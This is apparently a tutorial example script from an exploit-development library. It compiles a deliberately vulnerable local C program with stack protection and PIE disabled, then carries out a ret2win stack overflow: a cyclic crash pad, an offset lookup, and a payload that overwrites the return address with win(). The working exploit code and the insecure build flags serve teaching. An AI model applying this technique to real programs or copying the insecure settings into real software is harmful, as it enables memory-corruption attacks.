# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""cento -- borrowed fragments, arranged deliberately, checked as a whole.

Example 3 -- throw it for real: a local x86-64 ret2win

Everything so far ran against fiction. This one compiles a deliberately vulnerable C program on
YOUR machine (cc required; the example explains itself and exits cleanly without one), crashes
it with a cycle pad, reads the crash report, and lands win() -- the ex01 loop with a live target.
The victim's source lives in vuln.c, next to this script; its byte order is declared ONCE, in an inline
cento.target() profile, and every region and cycle_find below inherits it.

Three x86-64 facts do the teaching. First: a 64-bit `ret` refuses non-canonical targets, so
the pad never becomes rip -- the CPU faults ON the ret with the return address still at [rsp];
the debug fault handler prints that qword, and its low half is the cycle needle (the same trick
as reading rsp out of a corefile). Second: the fix writes ZEROS above win's low word -- a
canonical address needs its top bytes clean. Third: a straight ret into a function leaves rsp
8-misaligned, so win() prints with a raw write() -- stdio's SSE spills would fault (the classic
ret2win gotcha; see the C source).

Run: python3 examples/ex03/ex03_local_ret2win.py
Next: ex04_qemu_ret2win
"""

from __future__ import annotations

import pathlib
import re
import shutil
import struct
import subprocess
import sys
import tempfile

import cento

VULN_C = pathlib.Path(__file__).parent / "vuln.c"
LOCAL = cento.target({"schema": 1, "name": "local-x86", "endian": "little"})

PAD_LEN = 0x84  # generous: past any frame layout a compiler picks for buf[64]


def elf_symbol(path: pathlib.Path, name: str) -> int:
    """Address of `name` in a no-pie ELF64: a 20-line .symtab walk, so this file has no deps.

    (pwntools spells it ELF("./vuln").symbols["win"] -- use that on the day job.)
    """
    data = path.read_bytes()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    sections = [struct.unpack_from("<IIQQQQIIQQ", data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
    for _name, sh_type, _f, _a, sh_offset, sh_size, sh_link, _i, _al, sh_entsize in sections:
        if sh_type != 2:  # SHT_SYMTAB
            continue
        str_off = sections[sh_link][4]
        for off in range(sh_offset, sh_offset + sh_size, sh_entsize):
            st_name, _info, _other, _shndx, st_value = struct.unpack_from("<IBBHQ", data, off)
            end = data.index(b"\x00", str_off + st_name)
            if data[str_off + st_name : end] == name.encode():
                return int(st_value)  # struct gives Any under strict typing
    raise LookupError(f"{path.name}: no symbol {name!r}")


def compile_vuln(workdir: pathlib.Path) -> pathlib.Path | None:
    compiler = shutil.which("cc") or shutil.which("gcc") or shutil.which("clang")
    if compiler is None:
        return None
    binary = workdir / "vuln"
    subprocess.run([compiler, "-o", str(binary), str(VULN_C), "-O0", "-fno-stack-protector", "-no-pie"], check=True, capture_output=True)
    return binary


def throw(binary: pathlib.Path, payload: bytes) -> str:
    proc = subprocess.run([str(binary)], input=payload, capture_output=True, timeout=10)
    return (proc.stdout + proc.stderr).decode(errors="replace").strip()


def main() -> bool:
    with tempfile.TemporaryDirectory(prefix="cento-ret2win-") as tmp:
        binary = compile_vuln(pathlib.Path(tmp))
        if binary is None:
            print("no C compiler found (cc/gcc/clang) -- this example compiles its own target; install one and rerun")
            return True
        win = elf_symbol(binary, "win")
        print(f"compiled {binary.name} (-O0 -fno-stack-protector -no-pie); win() at {win:#x}")

        print("\nstep 1: throw the self-locating pad at the real binary")
        probe = LOCAL.region("frame", max_size=PAD_LEN, pad=4)  # little-endian from the profile
        report = throw(binary, probe.image())
        print(f"crash report: {report}")

        print("\nstep 2: the return address never left the stack -- cycle_find its low word")
        stack0 = int(re.search(r"stack0=0x([0-9a-f]+)", report).group(1), 16)  # type: ignore[union-attr]
        offset = probe.layout.cycle_find(stack0 & 0xFFFFFFFF)  # the layout knows the byte order: the flip cannot be forgotten
        print(f"cycle_find({stack0 & 0xFFFFFFFF:#x}) -> offset {offset} (0x{offset:x}) = the saved-rip slot")

        print(f"\nstep 3: rebuild -- win's low word at 0x{offset:x}, ZEROS above it (canonical or the ret faults)")
        aimed = LOCAL.region("frame", max_size=PAD_LEN, pad=4)
        aimed[offset] = win  # the patch rides on top of the pad: same cell, last write wins
        aimed[offset + 4] = 0  # the top half of the 64-bit slot: pad bytes here are a non-canonical rip
        print(aimed.layout.hexdump(skip=True))
        result = throw(binary, aimed.image())
        print(f"throw it: {result}")
    return True


if __name__ == "__main__":
    if not main():
        sys.exit(1)
